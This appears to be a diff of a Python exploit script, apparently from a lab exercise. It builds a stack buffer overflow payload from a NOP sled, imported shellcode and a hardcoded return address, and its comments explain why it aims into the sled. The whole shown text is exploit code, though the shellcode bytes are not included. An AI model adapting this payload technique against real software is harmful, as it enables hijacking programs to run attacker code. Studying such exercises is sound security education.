@@ -6,7 +6,7 @@ from shellcode import shellcode
 #sys.stdout.buffer.write(b'A'*10)
 # 1024-54=970 --> /2=485
 
-sys.stdout.buffer.write((b'\x90' * 960) + shellcode + b'A'*10 + (0x7ffffff6d2c8).to_bytes(8,"little"))
+sys.stdout.buffer.write((b'\x90' * 959) + shellcode + (0x7ffffff6d2c8).to_bytes(8,"little"))
 # 0x7ffffff6d4c8: ret
 # return to middle of noop sled
 # adding a big noop sled before the shellcode so the return address doesn’t have to be super precise
